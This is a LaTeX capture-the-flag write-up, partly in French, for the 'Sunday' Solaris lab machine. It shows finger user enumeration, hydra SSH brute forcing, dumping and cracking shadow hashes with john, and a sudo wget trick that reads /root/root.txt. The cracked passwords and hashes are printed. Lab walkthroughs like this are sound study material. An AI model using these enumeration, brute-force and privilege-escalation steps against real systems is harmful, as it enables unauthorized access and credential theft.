\chapter{Sunday}
\begin{itemize}
    \item {\bf technics}: finger
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\section{Résumé}


\section{Details}

\subsection{Recon}
\subsubsection{nmap}
\begin{verbatim}
$ PORTS=$(sudo nmap -p- --min-rate=1000 -T4 10.10.10.76 | 
    grep '^[0-9]' | cut -d'/' -f 1 | tr '\n' ',' | sed s/',$'//)
$ echo $PORTS
79,111,515,6787,22022

$ sudo nmap -p$PORTS -sV -sC 10.10.10.76
PORT      STATE SERVICE  VERSION
79/tcp    open  finger?
|_finger: No one logged on\x0D
| fingerprint-strings:
|   GenericLines:
|     No one logged on
|   GetRequest:
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|   HTTPOptions:
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|     OPTIONS ???
|   Help:
|     Login Name TTY Idle When Where
|     HELP ???
|   RTSPRequest:
|     Login Name TTY Idle When Where
|     OPTIONS ???
|     RTSP/1.0 ???
|   SSLSessionReq, TerminalServerCookie:
|_    Login Name TTY Idle When Where
111/tcp   open  rpcbind  2-4 (RPC #100000)
515/tcp   open  printer
6787/tcp  open  ssl/http Apache httpd 2.4.33 ((Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14)
| http-title: Solaris Dashboard
|_Requested resource was https://10.10.10.76:6787/solaris/
| ssl-cert: Subject: commonName=sunday
| Subject Alternative Name: DNS:sunday
| Not valid before: 2021-12-08T19:40:00
|_Not valid after:  2031-12-06T19:40:00
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
|_http-server-header: Apache/2.4.33 (Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14
22022/tcp open  ssh      OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey:
|   2048 aa:00:94:32:18:60:a4:93:3b:87:a4:b6:f8:02:68:0e (RSA)
|_  256 da:2a:6c:fa:6b:b1:ea:16:1d:a6:54:a1:0b:2b:ee:48 (ED25519)
\end{verbatim}

\subsubsection{79}

finger display information about local and remote users


\begin{verbatim}
$ telnet 10.10.10.76 79
Trying 10.10.10.76...
Connected to 10.10.10.76.
Escape character is '^]'.
helo
Login       Name               TTY         Idle    When    Where
helo                  ???
Connection closed by foreign host.
$ telnet 10.10.10.76 79
Trying 10.10.10.76...
Connected to 10.10.10.76.
Escape character is '^]'.
root
Login       Name               TTY         Idle    When    Where
root     Super-User            console      <Oct 14 10:28>
Connection closed by foreign host.
\end{verbatim}

donc user enum possible.

\url{https://github.com/nm2438/finger-user-enum-py}

\begin{verbatim}
$ ./finger-enum.py  -t 10 
    /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt 
    10.10.10.76

$ ./finger-enum.py  -t 10 
    /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt 
    10.10.10.76
# break car trop de lignes
\end{verbatim}

output notables
\begin{verbatim}
Found: root
root     Super-User            console      <Oct 14 10:28>
Found: sammy
sammy           ???            ssh          <Apr 13, 2022> 10.10.14.13
Found: sunny
sunny           ???            ssh          <Apr 13, 2022> 10.10.14.13
\end{verbatim}


\subsubsection{rpcbind}

\begin{verbatim}
$ sudo nmap -sSUC -p111 10.10.10.76
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-29 18:22 CEST
Nmap scan report for 10.10.10.76
Host is up (0.026s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
111/udp open  rpcbind

\end{verbatim}

\begin{verbatim}

\end{verbatim}

\subsubsection{ssh}
\begin{verbatim}
$ hydra -l sunny -P /usr/share/wordlists/passwords/rockyou.txt 
    ssh://10.10.10.76:22022

[22022][ssh] host: 10.10.10.76   login: sunny   password: sunday
\end{verbatim}

\subsection{Foothold}
\subsubsection{Sunny}
\begin{verbatim}
$ cat .bash_history
su -
su -
cat /etc/resolv.conf
su -
ps auxwww|grep overwrite
su -
sudo -l
sudo /root/troll
ls /backup
ls -l /backup
cat /backup/shadow.backup
sudo /root/troll
sudo /root/troll
su -
sudo -l
sudo /root/troll
ps auxwww
ps auxwww
ps auxwww
top
top
top
ps auxwww|grep overwrite
su -
su -
cat /etc/resolv.conf
ps auxwww|grep over
sudo -l
sudo /root/troll
sudo /root/troll
sudo /root/troll
sudo /root/troll

$ sudo -l
User sunny may run the following commands on sunday:
    (root) NOPASSWD: /root/troll

$ sudo /root/troll
testing
uid=0(root) gid=0(root)

$ ls -la /backup/
total 28
drwxr-xr-x   2 root     root           4 Dec 19  2021 .
drwxr-xr-x  25 root     sys           28 Oct 30 04:44 ..
-rw-r--r--   1 root     root         319 Dec 19  2021 agent22.backup
-rw-r--r--   1 root     root         319 Dec 19  2021 shadow.backup

$ cat /backup/agent22.backup
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
sunny@sunday:/backup$ cat /backup/shadow.backup
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
\end{verbatim}

\begin{verbatim}
$ john --wordlist=/usr/share/wordlists/passwords/rockyou.txt sunday.hash
Warning: detected hash type "sha256crypt", but the string is also recognized as "sha256crypt-opencl"
Use the "--format=sha256crypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha256crypt, crypt(3) $5$ [SHA256 128/128 AVX 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sunday           (sunny)
cooldude!        (sammy)
2g 0:00:00:20 DONE (2022-10-30 06:06) 0.09685g/s 9967p/s 10116c/s 10116C/s dominique15..amyliz
Use the "--show" option to display all of the cracked passwords reliably
Session completed
\end{verbatim}

\subsubsection{sammy}

\begin{verbatim}
$ sudo -l
User sammy may run the following commands on sunday:
    (ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
\end{verbatim}

\begin{verbatim}
$ LFILE=/root/root.txt
-bash-4.4$ sudo wget -i $LFILE
--2022-10-30 05:11:01--  http://2537b1d7e54975d654804addd2925a8e/
Resolving 2537b1d7e54975d654804addd2925a8e (2537b1d7e54975d654804addd2925a8e)... failed: temporary name resolution failure.
wget: unable to resolve host address '2537b1d7e54975d654804addd2925a8e'
\end{verbatim}
\section{Theorie}

\subsection{finger}



